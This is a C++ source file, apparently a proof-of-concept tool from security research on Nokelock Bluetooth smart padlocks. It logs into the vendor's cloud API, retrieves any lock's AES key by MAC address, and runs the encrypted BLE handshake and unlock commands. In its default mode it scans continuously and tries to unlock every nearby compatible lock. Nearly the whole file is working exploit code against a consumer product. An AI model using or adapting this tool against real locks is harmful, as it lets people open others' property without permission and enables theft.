#include <blepp/blestatemachine.h>
#include <blepp/lescan.h>
#include <blepp/pretty_printers.h>

#include <boost/program_options.hpp>

#include <crypto++/aes.h>
#include <crypto++/modes.h>

#include <cpprest/http_client.h>

#include <array>
#include <csignal>
#include <cstdint>
#include <cstdlib>
#include <iomanip>
#include <iostream>
#include <map>
#include <memory>
#include <sstream>
#include <string>
#include <vector>

#include <sys/select.h>

namespace po = boost::program_options;
namespace wh = web::http;
namespace wj = web::json;

namespace nokelock {
    class nokelock {
    public:
        static std::shared_ptr<nokelock> make_nokelock(std::string const& lock_mac, std::array<std::uint8_t, 16> const& key) {
            return std::make_shared<nokelock>(lock_mac, key);
        }

        nokelock(std::string const& lock_mac, std::array<std::uint8_t, 16> const& key) : m_lock_mac(lock_mac), m_aes_key(key){

        }

        virtual ~nokelock() {}

        /// Return the lock's MAC address
        std::string const& get_mac() const { return m_lock_mac; }

        /// Decrypt a 16 byte block containing a message
        std::array<std::uint8_t, 16> decrypt_message(std::array<std::uint8_t, 16> const& ciphertext) {
            std::array<std::uint8_t, 16> plaintext;

            CryptoPP::ECB_Mode<CryptoPP::AES>::Decryption dec;
            dec.SetKey(m_aes_key.data(), 16);

            dec.ProcessData(plaintext.data(), ciphertext.data(), 16);

            return plaintext;
        }

        /// Encrypt a 16 byte block to contain a message
        std::array<std::uint8_t, 16> encrypt_message(std::array<std::uint8_t, 16> const& plaintext) {
            std::array<std::uint8_t, 16> ciphertext;

            CryptoPP::ECB_Mode<CryptoPP::AES>::Encryption enc;
            enc.SetKey(m_aes_key.data(), 16);

            enc.ProcessData(ciphertext.data(), plaintext.data(), 16);

            return ciphertext;
        }

        std::array<std::uint8_t, 16> get_aes_key() const { return m_aes_key; }

        typedef std::shared_ptr<nokelock> ptr;
    private:
        std::string m_lock_mac;
        std::array<std::uint8_t, 16> m_aes_key;
    };

} // end namespace nokelock

static
std::map<std::string, nokelock::nokelock::ptr> lock_cache;

volatile
bool terminate = false;

void _on_sigint(int)
{
    terminate = true;
}

static std::string const api_uri_base("http://app.nokelock.com:8080/");

wh::http_request make_request(std::string const& resource, wj::value const& body, std::string const& token = "")
{
    wh::http_request req(wh::methods::POST);

    req.set_request_uri(resource);
    req.headers().set_content_type("application/json");
    req.headers().add("clientType", "Android");
    req.headers().add("language", "en-US");
    req.headers().add("phoneModel", "SM-T113");
    req.headers().add("osVersion", "4.4.4");
    req.headers().add("appVersion", "4.0.1");
    if (not token.empty()) {
        req.headers().add("token", token);
    }

    req.set_body(body);

    return req;
}

std::string get_nokelock_token(std::string const& username, std::string const& password)
{
    static std::string const user_login_by_password("/newNokelock/user/loginByPassword");

    wh::client::http_client client(api_uri_base);

    // Create the JSON body for the login request
    auto obj = wj::value::object();
    obj["type"] = wj::value("0");
    obj["account"] = wj::value(username);
    obj["code"] = wj::value(password);

    // This is required because the Nokelock API is really bizarre
    auto str = wj::value(obj.serialize());

    std::cout << "DEBUG: Login request: " << str << std::endl;

    auto resp = client.request(make_request(user_login_by_password, str)).get();
    auto json_resp = resp.extract_json().get();

    std::cout << "DEBUG: Response: " << json_resp.serialize() << std::endl;

    if (json_resp["status"] != wj::value("2000")) {
        std::stringstream ss;
        ss << "Unexpected status code returned: " << json_resp["status"] << ", aborting.";
        throw std::runtime_error(ss.str());
    }

    auto result = json_resp["result"];
    return result["token"].as_string();
}

wj::value _fetch_nokelock_info(std::string const& token, std::string const& lock_mac)
{
    static std::string const lock_query_device("/newNokelock/lock/queryDevice");

    wh::client::http_client client(api_uri_base);

    auto req_obj = wj::value::object();
    req_obj["mac"] = wj::value(lock_mac);

    auto resp = client.request(make_request(lock_query_device, req_obj, token)).get();
    auto json_resp = resp.extract_json().get();

    std::cout << "DEBUG: queryDevice response: " << json_resp << std::endl;

    if (json_resp["status"] != wj::value("2000")) {
        std::stringstream ss;
        ss << "Got status code " << json_resp["status"] << " when requesting by MAC. Aborting.";
        throw std::runtime_error(ss.str());
    }

    auto result = json_resp["result"];

    return result;
}

nokelock::nokelock::ptr get_nokelock_keys(std::string const& token, std::string const& lock_mac)
{
    auto lock_cached = lock_cache.find(lock_mac);
    std::array<std::uint8_t, 16> key;

    if (lock_cached != lock_cache.end()) {
        return lock_cached->second;
    }

    auto lock_params = _fetch_nokelock_info(token, lock_mac);

    std::istringstream key_string(lock_params["lockKey"].as_string());
    std::string byte;
    size_t offset = 0;

    while (getline(key_string, byte, ',') and offset < 16) {
        key[offset++] = std::stoi(byte);
    }

    auto new_lock = nokelock::nokelock::make_nokelock(lock_mac, key);

    lock_cache.insert(std::make_pair(lock_mac, new_lock));

    return new_lock;
}

enum lock_state {
    STATE_SEARCHING,
    STATE_ATTACH_NOTIFY,
    STATE_HANDSHAKE_1,
    STATE_HANDSHAKE_2,
    STATE_HANDSHAKE_3,
    STATE_SEND_UNLOCK_CMD,
    STATE_WAIT_UNLOCK_NOTIFY,
    STATE_WAIT_UNLOCK_FINISH,
    STATE_DONE,
};

void connect_nokelock(std::string const& token, std::string const& lock_mac)
{
    bool done = false;

    auto lock = get_nokelock_keys(token, lock_mac);

    std::array<std::uint8_t, 4> entropy;

    lock_state state = STATE_SEARCHING;

    // Set up the Nokelock known GATT services of interest
    BLEPP::UUID command("36f5");
    BLEPP::UUID notify("36f6");
    BLEPP::UUID lock_service("fee7");
    BLEPP::UUID name("2a00");

    BLEPP::BLEGATTStateMachine gatt;

    // Notification callback
    std::function<void (BLEPP::PDUNotificationOrIndication const&)> on_notify = [&](BLEPP::PDUNotificationOrIndication const& notify) {
        auto notify_data = notify.value().first;
        std::array<std::uint8_t, 16> cmd;
        std::copy(notify_data, notify_data + 16, cmd.begin());
        auto plaintext = lock->decrypt_message(cmd);

        std::cout << "Got notification!" << std::endl;

        for (auto v: plaintext) {
            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
        }
        std::cout << std::dec << std::endl;

        switch (state) {
        case STATE_HANDSHAKE_1:
            entropy[0] = plaintext[3];
            entropy[1] = plaintext[4];
            entropy[2] = plaintext[5];
            entropy[3] = plaintext[6];
            state = STATE_HANDSHAKE_2;
            break;
        case STATE_HANDSHAKE_3:
            state = STATE_SEND_UNLOCK_CMD;
            break;
        case STATE_WAIT_UNLOCK_NOTIFY:
            std::cout << "Got unlock notify" << std::endl;
            state = STATE_WAIT_UNLOCK_FINISH;
            break;
        case STATE_WAIT_UNLOCK_FINISH:
            state = STATE_DONE;
        default:
            break;
        }
    };

    // Callback that's hit when the device is found, along with its details
    std::function<void()> on_found_service = [&]() {
        bool command_found = false;
        bool notify_found = false;
        for (auto& service: gatt.primary_services) {
            std::cout << "Service UUID: " << BLEPP::to_str(service.uuid) << " (Handle " << service.start_handle << " to " << service.end_handle << ")" << std::endl;

#if 0
            if (not (service.uuid == lock_service)) {
                continue;
            }
#endif

            // First find the notify characteristic and install a callback handler
            for (auto& characteristic: service.characteristics) {
                std::cout << "  Characteristic: " << BLEPP::to_str(characteristic.uuid) << std::endl;
                if (characteristic.uuid == notify) {
                    notify_found = true;
                    std::cout << "  I have Nokelock Notify capabilities" << std::endl;

                    characteristic.cb_notify_or_indicate = on_notify;
                    characteristic.set_notify_and_indicate(true, false);
                }
            }

            state = STATE_ATTACH_NOTIFY;

            // Now find the command endpoint (just make sure it's there)
            for (auto& characteristic: service.characteristics) {
                if (characteristic.uuid == command) {
                    command_found = true;

                    std::cout << "  I have Nokelock Command capabilities" << std::endl;
                }
            }
        }

        done = not (command_found and notify_found);
    };

    // Setup the scan
    gatt.setup_standard_scan(on_found_service);

    // The disconnection callback will be handy, if something goes wrong
    gatt.cb_disconnected = [&done](BLEPP::BLEGATTStateMachine::Disconnect d) {
        if (d.reason != BLEPP::BLEGATTStateMachine::Disconnect::ConnectionClosed) {
            std::cout << "Disconnected from device. Reason: " << BLEPP::BLEGATTStateMachine::get_disconnect_string(d) << std::endl;
        }
        done = true;
    };

    // Connect to the device
    gatt.connect_blocking(lock_mac);

    std::cout << "DEBUG: connected to device " << lock_mac << std::endl;

    while (false == done && false == terminate) {
        gatt.read_and_process_next();

        // Make sure the GATT state machine is idle
        if (not gatt.is_idle()) {
            continue;
        }

        switch (state) {
        case STATE_ATTACH_NOTIFY:
            // Send initial command
            std::cout << "DEBUG: sending initial command" << std::endl;
            for (auto& service: gatt.primary_services) {
                for (auto& characteristic: service.characteristics) {
                    if (characteristic.uuid == command) {
                        // Write the connect command out
                        std::array<std::uint8_t, 16> cmd = { 0x06, 0x01, 0x01, 0x01 };

                        for (auto v: cmd) {
                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
                        }
                        std::cout << std::dec << std::endl;

                        auto cmd_enc = lock->encrypt_message(cmd);
                        characteristic.write_request(cmd_enc);

                        state = STATE_HANDSHAKE_1;
                    }
                }
            }
            break;

        case STATE_HANDSHAKE_2:
            std::cout << "DEBUG: sending followup handshake" << std::endl;
            for (auto& service: gatt.primary_services) {
                for (auto& characteristic: service.characteristics) {
                    if (characteristic.uuid == command) {
                        // Write the connect command out
                        std::array<std::uint8_t, 16> cmd = { 0x02, 0x01, 0x01, 0x01, entropy[0], entropy[1], entropy[2], entropy[3], 0x06, 0x02,  };
                        for (auto v: cmd) {
                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
                        }
                        std::cout << std::dec << std::endl;

                        auto cmd_enc = lock->encrypt_message(cmd);
                        characteristic.write_request(cmd_enc);

                        state = STATE_HANDSHAKE_3;
                    }
                }
            }
            break;

        case STATE_SEND_UNLOCK_CMD:
            std::cout << "DEBUG: sending third handshake" << std::endl;
            for (auto& service: gatt.primary_services) {
                for (auto& characteristic: service.characteristics) {
                    if (characteristic.uuid == command) {
                        // Write the connect command out
                        std::array<std::uint8_t, 16> cmd = { 0x05, 0x01, 0x06, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, entropy[0], entropy[1], entropy[2], entropy[3] };

                        for (auto v: cmd) {
                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
                        }
                        std::cout << std::dec << std::endl;

                        auto cmd_enc = lock->encrypt_message(cmd);
                        characteristic.write_request(cmd_enc);

                        state = STATE_WAIT_UNLOCK_NOTIFY;
                    }
                }
            }
            break;

        case STATE_HANDSHAKE_1:
        case STATE_HANDSHAKE_3:
        case STATE_WAIT_UNLOCK_FINISH:
        case STATE_WAIT_UNLOCK_NOTIFY:
        case STATE_SEARCHING:
            continue;

        case STATE_DONE:
            done = true;
            break;

        default:
            throw std::runtime_error("Unexpected state in unlock state machine, aborting.");
        }
    }

    // No need to remain connected
    gatt.close();

    std::cout << "DEBUG: now you know what I know about " << lock_mac << std::endl;
}

std::vector<std::string> find_nokelocks(std::size_t nr_iters = 10)
{
    std::vector<std::string> locks;
    std::size_t iter_id = 0;

    fd_set fd_scan;
    FD_ZERO(&fd_scan);

    struct timeval fd_scan_timeout = {
        .tv_sec = 0,
        .tv_usec = 500000
    };

    BLEPP::UUID notification("fee7");

    BLEPP::HCIScanner scanner(true, BLEPP::HCIScanner::FilterDuplicates::Software,
            BLEPP::HCIScanner::ScanType::Active);

    while (locks.size() == 0 and false == terminate and iter_id++ < nr_iters) {
        FD_SET(scanner.get_fd(), &fd_scan);

        // This is shiesty
        int errnum = select(scanner.get_fd() + 1, &fd_scan, NULL, NULL, &fd_scan_timeout);
        if (errnum < 0 || true == terminate) {
            break;
        }

        if (FD_ISSET(scanner.get_fd(), &fd_scan)) {
            std::vector<BLEPP::AdvertisingResponse> resps = scanner.get_advertisements();

            for (auto const& resp: resps) {
                for (auto const& uuid: resp.UUIDs) {
                    if (uuid == notification) {
                        std::cout << "Device found: " << resp.address << std::endl;
                        std::cout << "  Service: " << BLEPP::to_str(uuid) << std::endl;

                        locks.push_back(resp.address);
                        break;
                    }
                }
            }
        }
    }

    return locks;
}

int main(int const argc, char const* const argv[])
{
    po::options_description desc("Main Options");

    desc.add_options()
        ("help,h",          "Get some help (this screen)")
        ("mac-address,m",   po::value<std::string>()->default_value(""), "Specific lock MAC address")
        ("username,u",      po::value<std::string>()->default_value(""), "Nokelock backend username")
        ("password,p",      po::value<std::string>()->default_value(""), "Nokelock backend password")
        ("token,t",         po::value<std::string>()->default_value(""), "Nokelock login token (fill in user/pass if you don't have one yet)")
        ("search,S",        po::value<bool>()->default_value(true), "Search for Nokelocks (default)")
        ;

    po::variables_map args;
    po::store(po::command_line_parser(argc, argv)
            .options(desc)
            .run(), args);
    po::notify(args);

    auto mac_address = args["mac-address"].as<std::string>();
    auto username = args["username"].as<std::string>();
    auto password = args["password"].as<std::string>();
    auto token = args["token"].as<std::string>();

    if (token.empty() && (username.empty() || password.empty())) {
        throw std::runtime_error("Need to specify a username and password to log in, or an existing valid token");
    }

    if (token.empty()) {
        token = get_nokelock_token(username, password);
        std::cout << "Login token: " << token << std::endl;
        std::cout << "NOTE: you can reuse this token for subsequent sessions." << std::endl;
    }

    bool search = args["search"].as<bool>();

    // Catch SIGINT, so we can clean up nicely
    std::signal(SIGINT, _on_sigint);

    if (true == search) {
        // Search for all Nokelock compatible locks we can find
        std::cout << "Searching for locks to unlock" << std::endl;
        while (false == terminate) {
            auto locks = find_nokelocks();
            for (auto const& lock: locks) {
                // Connect to the lock, but eat any exceptions that happen, since the
                // lock could go out of range or just stop responding for various legitimate
                // reasons.
                try {
                    connect_nokelock(token, lock);
                } catch (...) {
                    std::cout << "An error occurred while connecting to the lock." << std::endl;
                }
            }
        }
    } else if (not mac_address.empty()) {
        std::cout << "Searching for lock " << mac_address << std::endl;
        connect_nokelock(token, mac_address);
    }

    return EXIT_SUCCESS;
}

